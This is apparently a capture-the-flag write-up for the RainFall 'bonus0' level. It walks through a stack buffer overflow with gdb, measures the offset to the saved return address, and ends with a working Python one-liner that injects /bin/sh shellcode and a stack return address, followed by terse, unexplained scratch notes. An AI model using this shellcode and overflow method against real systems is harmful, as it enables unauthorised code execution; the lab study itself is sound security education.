# bonus 00

The program wait for two input, and print them concatenated by a space :

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
qwerty
 - 
qwerty
qwerty qwerty
```

By looking at the code, we can see that there are two read function executed. Each buffer read from the stdin is truncated to 20 bytes. They are then concatened with a strcpy first, and a strcat.

By simply passing two input of 20 bytes length, the program segfault:

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

By looking after the function `pp`, we can see that there are 4 four random bytes copied before the space :

```bash
Breakpoint 3, 0x080485bd in main ()
(gdb) x/24wx $eax
0xbffff6d6:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6e6:     0x41414141      0x42424242      0x42424242      0x42424242
0xbffff6f6:     0x42424242      0x42424242      0xb7fd0ff4      0x42424220
0xbffff706:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff716:     0xfd0ff442      0xc85800b7      0x0000b7fd      0xf71c0000
0xbffff726:     0xf7acbfff      0x0000bfff      0x824c0000      0x0ff40804
(gdb) x $ebp
0xbffff708:     0x42424242
(gdb) x $ebp+4
0xbffff70c:     0x42424242
(gdb) p/d 0xbffff70c-0xbffff6d6
$3 = 54
```

`eip` is 54 bytes from the beginning of the buffer. We have five bytes between the 40 first and the last 20. So we need to put bytes at 10th position of the second buffer to overwrite `eip` :

```
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBCCCCBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBCCCCBBBBBBB��� BBBBBBBBBCCCCBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```


(python -c 'print "\x90" * (20-14) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"'; python -c 'print "\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x26\xf7\xff\xbf" + "C" * (20-13)';cat) | ./bonus0


0x080485b4

set exec-wrapper env -u LINES -u COLUMNS

x/s *((char **)environ)

0x \bf \ff \f8 \8c

0xbffff877

0x \bf \ff \f8 \8c

0xbfffe600